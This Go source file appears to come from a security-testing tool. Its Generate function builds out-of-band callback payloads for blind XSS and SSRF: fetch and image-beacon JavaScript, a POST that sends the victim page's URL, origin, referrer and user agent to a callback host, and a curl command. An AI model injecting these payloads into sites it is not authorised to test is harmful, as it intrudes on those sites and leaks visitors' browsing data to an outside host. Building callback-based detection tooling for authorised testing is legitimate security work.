package payload

import (
	"fmt"
	"strings"
)

func Generate(baseURL, id, kind string) (string, error) {
	url := strings.TrimRight(baseURL, "/") + "/c/" + id
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case "xss-fetch":
		return fmt.Sprintf("fetch(%q,{mode:%q})", url, "no-cors"), nil
	case "xss-event":
		return fmt.Sprintf("fetch(%q,{method:%q,headers:{%q:%q},body:JSON.stringify({marker:%q,url:location.href,origin:location.origin,referrer:document.referrer,userAgent:navigator.userAgent})})",
			url, "POST", "content-type", "application/json", "CBX-"+id), nil
	case "xss-img":
		return fmt.Sprintf("new Image().src=%q", url), nil
	case "ssrf", "webhook":
		return url, nil
	case "curl":
		return fmt.Sprintf("curl -i %q", url), nil
	default:
		return "", fmt.Errorf("unsupported payload type %q", kind)
	}
}
